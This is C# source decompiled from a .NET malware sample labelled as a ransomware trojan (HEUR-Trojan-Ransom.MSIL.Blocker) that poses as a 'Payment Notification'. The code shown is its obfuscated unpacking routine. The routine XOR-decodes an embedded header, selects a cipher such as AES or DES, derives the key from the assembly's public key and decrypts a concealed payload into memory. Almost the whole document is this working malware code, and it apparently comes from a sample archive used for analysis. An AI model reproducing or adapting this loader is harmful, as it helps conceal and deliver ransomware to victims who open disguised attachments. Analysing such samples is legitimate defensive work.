// Decompiled with JetBrains decompiler
// Type: 
// Assembly: Payment Notification, Version=98.0.1.8107, Culture=neutral, PublicKeyToken=null
// MVID: FA79794C-3025-C735-E6EB-7AA05AC66D58
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-Ransom.MSIL.Blocker.gen-9edc14cb7b9c966a121bf2b954dc49826435e452a4b161242d42fda789ed45da.exe

using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;

internal class \uE00D
{
  public static Stream \uE006(Stream _param0)
  {
    BinaryReader binaryReader1 = new BinaryReader(_param0);
label_2:
    int num1 = \uE013.\uE023(73);
    byte[] buffer1;
    byte[] buffer2;
    while (true)
    {
      int index;
      int length;
      int count;
      switch (num1)
      {
        case 0:
          binaryReader1.Read(buffer1, 0, buffer1.Length);
          num1 = 1;
          continue;
        case 1:
          index = 0;
          num1 = 3;
          continue;
        case 2:
          length = (int) binaryReader1.ReadByte();
          num1 = 8;
          continue;
        case 3:
          if (index != 0)
          {
            num1 = 7;
            continue;
          }
          break;
        case 4:
          buffer2 = new byte[count];
          num1 = 5;
          continue;
        case 5:
          binaryReader1.Read(buffer2, 0, count);
          num1 = 2;
          continue;
        case 6:
          count = (int) binaryReader1.ReadUInt16();
          num1 = 4;
          continue;
        case 7:
label_11:
          buffer2[index] = (byte) ((uint) buffer2[index] ^ (uint) buffer1[index % length]);
          num1 = 9;
          continue;
        case 8:
          buffer1 = new byte[length];
          num1 = 0;
          continue;
        case 9:
          ++index;
          break;
        default:
          goto label_2;
      }
      if (index < count)
        goto label_11;
      else
        break;
    }
    byte num2 = 0;
    SymmetricAlgorithm symmetricAlgorithm = (SymmetricAlgorithm) null;
    BinaryReader binaryReader2 = new BinaryReader((Stream) new MemoryStream(buffer2, false));
    try
    {
      binaryReader2.ReadString();
      num2 = binaryReader2.ReadByte();
      int num3 = (int) binaryReader2.ReadByte();
      byte num4 = binaryReader2.ReadByte();
      int count = (int) binaryReader2.ReadByte();
      byte[] numArray = new byte[count];
      binaryReader2.Read(numArray, 0, count);
      if (num4 < (byte) 64)
      {
        binaryReader2.Read(numArray, 0, count);
      }
      else
      {
        byte[] publicKey = Assembly.GetExecutingAssembly().GetName().GetPublicKey();
        if ((publicKey == null ? 0 : 1) == 0)
          throw new InvalidOperationException();
        Buffer.BlockCopy((Array) publicKey, (int) num4 + 12, (Array) numArray, 0, count);
      }
      symmetricAlgorithm = \uE00D.\uE007((byte) num3);
label_23:
      int num5 = \uE013.\uE023(72);
      while (true)
      {
        switch (num5)
        {
          case 0:
            symmetricAlgorithm.IV = buffer1;
            num5 = 1;
            continue;
          case 1:
            symmetricAlgorithm.Key = numArray;
            num5 = 2;
            continue;
          case 2:
            goto label_29;
          default:
            goto label_23;
        }
      }
    }
    finally
    {
      if ((binaryReader2 == null ? 1 : 0) == 0)
        binaryReader2.Dispose();
    }
label_29:
    MemoryStream memoryStream1 = new MemoryStream();
    if ((((int) num2 & 2) == 0 ? 1 : 0) == 0)
    {
      CryptoStream cryptoStream = new CryptoStream(binaryReader1.BaseStream, symmetricAlgorithm.CreateDecryptor(), CryptoStreamMode.Read);
      try
      {
        \uE00D.\uE008((Stream) cryptoStream, (Stream) memoryStream1);
      }
      finally
      {
        if ((cryptoStream == null ? 1 : 0) == 0)
          cryptoStream.Dispose();
      }
      if ((((int) num2 & 1) == 0 ? 1 : 0) == 0)
      {
        memoryStream1.Position = 0L;
label_38:
        int num6 = \uE013.\uE023(82);
        MemoryStream memoryStream2;
        while (true)
        {
          switch (num6)
          {
            case 0:
              memoryStream1 = memoryStream2;
              num6 = \uE013.\uE023(70);
              continue;
            case 1:
              memoryStream2 = new MemoryStream();
              num6 = 2;
              continue;
            case 2:
              \uE013.\uE022((Stream) memoryStream1, (Stream) memoryStream2);
              num6 = 0;
              continue;
            case 3:
              goto label_45;
            default:
              goto label_38;
          }
        }
      }
    }
    else if (num2 == (byte) 1)
      \uE013.\uE022(binaryReader1.BaseStream, (Stream) memoryStream1);
    else
      \uE00D.\uE008(binaryReader1.BaseStream, (Stream) memoryStream1);
label_45:
    memoryStream1.Position = 0L;
    return (Stream) memoryStream1;
  }

  public static SymmetricAlgorithm \uE007(byte _param0)
  {
    string str = (string) null;
    switch (_param0)
    {
      case 1:
        str = "DES";
        break;
      case 2:
        str = "Aes";
        break;
      case 3:
        str = "TripleDES";
        break;
      case 4:
        str = "Rijndael";
        break;
      case 5:
        str = "RC2";
        break;
      case 6:
        return (SymmetricAlgorithm) new \uE00C();
    }
    string typeName = "System.Security.Cryptography." + str;
    object type = (object) Type.GetType(typeName, false);
    if ((type == null ? 0 : 1) == 0)
      type = (object) Type.GetType(typeName + ", System.Security.Cryptography.Algorithms", false);
    return (type == null ? 0 : 1) != 0 ? (SymmetricAlgorithm) ((Type) type).InvokeMember("Create", BindingFlags.Static | BindingFlags.Public | BindingFlags.InvokeMethod, (Binder) null, (object) null, (object[]) null) : throw new InvalidOperationException(string.Format("Could not load type {0}", (object) typeName));
  }

  public static void \uE008(Stream _param0, Stream _param1)
  {
    byte[] buffer = new byte[4096];
    while (true)
    {
      int count = _param0.Read(buffer, 0, buffer.Length);
      if (count > 0)
        _param1.Write(buffer, 0, count);
      else
        break;
    }
  }
}
